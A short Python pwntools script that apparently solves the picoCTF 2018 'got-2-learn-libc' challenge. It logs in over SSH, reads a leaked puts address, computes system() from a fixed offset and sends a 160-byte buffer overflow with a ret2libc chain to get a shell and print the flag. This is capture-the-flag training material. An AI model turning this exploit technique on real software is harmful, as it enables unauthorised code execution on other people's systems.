from pwn import *
import json

REMOTE=True
hostname ="2018shell.picoctf.com"
if REMOTE:
    with open("creds.json") as f:
        creds = json.load(f)
        print(creds["user"],creds["pass"])
    s = ssh(host=hostname,user=creds["user"],password=creds["pass"])
    s.set_working_directory(b"/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833")
    sh = s.process('sh')
    sh.sendline('./vuln')
    sh.recvline()

    #All addresses given from program
    addresses = sh.recvuntil("string:\n").decode()
    #Address of puts program
    useful = addresses.split()[9]
    putsadd = addresses.split()[1]
    #the base10 address of puts
    hexofad = int(putsadd,16)

    #offset between system and puts
    offset = -149504
    #system address
    system_address = hex(hexofad + offset)
    sa = hexofad + offset

    ua = int(useful,16)
    payload =b'A' * 160 + p32(sa) + b'BBBB' + p32(ua)

    sh.sendline(payload)
    sh.sendline("cat flag.txt")
    print(sh.recvuntil("}"))
    #sh.interactive()
